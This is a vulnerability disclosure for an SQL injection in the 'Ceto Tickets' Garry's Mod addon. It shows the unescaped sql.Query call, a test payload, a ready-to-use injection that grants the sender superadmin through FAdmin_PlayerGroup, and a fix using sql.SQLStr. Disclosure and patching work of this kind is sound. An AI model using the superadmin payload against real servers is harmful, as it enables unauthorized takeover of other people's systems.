# Ceto Tickets SQL Injection
Found by OverlordAkise on 2021.04.14  
Addon was available on gmodstore.com, got taken down for this vulnerability.  
This addon is, despite this vulnerability, still used on a lot of servers.  

Ceto Tickets has an SQL Injection vulnerability in the TicketSystem:CreateAnswer net.Receive function.

### TL;DR
Ceto Tickets neither sanitizes player input before inserting into the database nor check the comment on the ticket for special characters.  
This allows players to use an SQL Injection on the `TicketSystem:CreateAnswer` network channel via a malformed comment text from `net.ReadString`. This vulnerability can be done without any external tools, as the SQL Injection can be directly written in the comment of a ticket.  

### The Code
This is the Code that is responsible for the SQL Injection.
```LUA 
net.Receive("TicketSystem:CreateAnswer", function(len, pPlayer)
  self:CreateAnswer(pPlayer, net.ReadString(), net.ReadString());
end);

function cTicketSystem:CreateAnswer(pPlayer, strText, strID)
	if (not tonumber(strID)) then
		return false;
	end

	if (cTicketSystem:IsSpamActive(pPlayer)) then
		return cFlatNotify:add(pPlayer, "Ticketsystem", cLS:GetPhrase("YOU_ARE_COOLED"), 3000, "DANGER");
	end

	local tblTicket = self:GetMyTicket(pPlayer, tonumber(strID));
	if (cTicketSystem:IsClosed(tblTicket)) then
		return cFlatNotify:add(pPlayer, "Ticketsystem", cLS:GetPhrase("TICKET_IS_CLOSED"), 3000, "DANGER");
	end

	cFlatNotify:add(pPlayer, "Ticketsystem", cLS:GetPhrase("ANSWER_CREATED"), 3000, "SUCCESS");
	if (tblTicket) then
		sql.Query("INSERT INTO gg_ticket_answers (steam, user, ticket, text, date) VALUES ('"..pPlayer:SteamID64().."', '"..pPlayer:Nick().."', '"..tonumber(strID).."', '"..strText.."', '"..os.time().."')");
		cTicketSystem:ShowMyTicket(pPlayer, tonumber(strID));

		cTicketSystem:Log(pPlayer:Nick().." | "..cLS:GetPhrase("ANSWER_CREATED").." (#"..strID..")");
	end
end
```

### The Problem
```LUA
sql.Query("INSERT INTO gg_ticket_answers (steam, user, ticket, text, date) VALUES ('"..pPlayer:SteamID64().."', '"..pPlayer:Nick().."', '"..tonumber(strID).."', '"..strText.."', '"..os.time().."')");
```
The player comment, that is a net.ReadString() from the player, gets inserted without any check or escape.  
This allows us to insert anything we want into the database, because the addon doesn't check the comment a player sends.  
It doesn't even get checked for a max length, which enables us to do even the longest exploits.  


### Example Code / Comments
This exploit doesn't need any special tools or LUA code, as the SQL Injection can be written directly into the comment textbox of a ticket.  
An example to check if the exploit works:
```
Testing old!', '93');
```
The above code, if commented in a ticket as a response, should show the date "01:01 01.01.1970" with the text "Testing old!".  
If it does, then the exploit works and should be reported to an admin or higher.  
If it doesn't work, then the text should show up in the comment like this: `Testing old!', '93');`  
This means that the exploit doesn't work and the addon is save to use.  
  
If this exploit works - and the server has FAdmin still enabled - you can use the following comment text to make yourself superadmin:
```
Testing sa!', '93'); INSERT INTO FAdmin_PlayerGroup(steamid, groupname) VALUES('your_steamid_here','superadmin');--
```
If you rejoin now you should have the rank superadmin and access to all the ULX commands if the server has ULX installed.  



### Fixing the exploit
The easiest fix would be: Correctly escape player input.  
Instead of `, '"..strText.."',` the sql-code should be `, "..sql.SQLStr(strText)..",`. This would make SQL Injections impossible.  
This would make this
```LUA
sql.Query("INSERT INTO gg_ticket_answers (steam, user, ticket, text, date) VALUES ('"..pPlayer:SteamID64().."', '"..pPlayer:Nick().."', '"..tonumber(strID).."', '"..strText.."', '"..os.time().."')");
``` 
to this
```LUA
sql.Query("INSERT INTO gg_ticket_answers (steam, user, ticket, text, date) VALUES ('"..pPlayer:SteamID64().."', '"..pPlayer:Nick().."', '"..tonumber(strID).."', "..sql.SQLStr(strText)..", '"..os.time().."')");
``` 
and now no more exploits are possible.
